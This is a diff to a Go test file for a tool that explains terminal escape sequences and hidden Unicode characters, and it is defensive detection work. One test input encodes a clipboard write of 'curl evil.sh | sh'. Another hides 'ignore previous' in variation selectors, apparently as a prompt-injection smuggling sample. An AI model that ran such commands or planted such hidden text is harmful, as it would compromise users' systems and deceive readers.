@@ -91,6 +91,28 @@ func TestAC1ControlIsNamed(t *testing.T) {
 	}
 }
 
+// The raw 8-bit forms, as bytes rather than as the UTF-8 encoding of a C1
+// code point, are sequences like their ESC spellings: a clipboard write came
+// back as a byte row, its payload as text and its BEL as an invisible
+// character.
+func TestAn8BitSequenceIsExplainedAsOne(t *testing.T) {
+	osc := rowFor(t, "x\x9d52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07y", "OSC")
+	if !strings.Contains(osc[2], `clipboard WRITE (selection "c"): "curl evil.sh | sh"`) {
+		t.Errorf("8-bit OSC 52 = %v", osc)
+	}
+	csi := rowFor(t, "x\x9b2Jy", "CSI")
+	if !strings.Contains(csi[2], "erase entire screen") || csi[0] != `\x9b2J` {
+		t.Errorf("8-bit CSI = %v", csi)
+	}
+	for _, input := range []string{"x\x9d52;c;aGk=\x07y", "x\x9b2Jy"} {
+		for _, row := range explainAnsi(input).Rows {
+			if row[1] == "byte" || row[1] == "invisible" || row[0] == "2Jy" {
+				t.Errorf("%q: row %v, want the sequence explained whole", input, row)
+			}
+		}
+	}
+}
+
 // APC was reported as "ESC sequence (final \"ÿ\")"; DCS was never more than a
 // label. The payloads that matter are named: kitty graphics, tmux passthrough
 // with what it passes through, and the requests that make a terminal answer.
@@ -126,10 +148,53 @@ func TestASequencePayloadIsEscapedByRune(t *testing.T) {
 	}
 }
 
+// A run of variation selectors after one emoji carries a byte per selector,
+// and came back as a single text row showing the emoji alone. The row names
+// the run and decodes it.
+func TestARunOfVariationSelectorsIsDecoded(t *testing.T) {
+	var smuggled strings.Builder
+	smuggled.WriteString(r(0x1f600))
+	for _, b := range []byte("ignore previous") {
+		if b < 16 {
+			smuggled.WriteRune(0xfe00 + rune(b))
+		} else {
+			smuggled.WriteRune(0xe0100 + rune(b) - 16)
+		}
+	}
+	table := explainAnsi(smuggled.String() + "ok")
+	row := rowFor(t, smuggled.String()+"ok", "selectors")
+	if row[0] != "<15 variation selectors>" || !strings.Contains(row[2], `"ignore previous"`) {
+		t.Errorf("selector row = %v", row)
+	}
+	if len(table.Rows) != 3 || table.Rows[0][0] != r(0x1f600) || table.Rows[2][0] != "ok" {
+		t.Errorf("rows = %v, want the emoji, the run, and the text after it", table.Rows)
+	}
+}
+
+// Fillers and the other characters that draw as nothing or as a blank are
+// named, where they came back inside a text row nobody could read them in.
+func TestAFillerIsNamed(t *testing.T) {
+	for cp, want := range map[rune]string{
+		0x00ad: "soft hyphen",
+		0x061c: "Arabic letter mark",
+		0x180e: "Mongolian vowel separator",
+		0x2028: "line separator",
+		0x3164: "Hangul filler",
+		0xffa0: "halfwidth Hangul filler",
+	} {
+		row := rowFor(t, "a"+r(cp)+"b", "invisible")
+		if !strings.Contains(row[2], want) || strings.ContainsRune(row[0], cp) {
+			t.Errorf("U+%04X: row = %v, want it named %q and escaped", cp, row, want)
+		}
+	}
+}
+
 // Nothing ordinary is mistaken for hidden: accents, CJK, emoji built with a
-// joiner, and a lone combining mark all stay text.
+// joiner, a lone combining mark, an emoji's colour form, and an ideograph's
+// variant form in a name all stay text.
 func TestOrdinaryTextStaysText(t *testing.T) {
-	for _, input := range []string{"café", "漢字", "👩" + r(0x200d) + "💻", "e" + r(0x301)} {
+	for _, input := range []string{"café", "漢字", "👩" + r(0x200d) + "💻", "e" + r(0x301),
+		"love " + r(0x2764) + r(0xfe0f), "葛" + r(0xe0100) + "飾区"} {
 		table := explainAnsi(input)
 		if table.Total != 1 || table.Rows[0][1] != "text" {
 			t.Errorf("%q: rows = %v, want one text row", input, table.Rows)
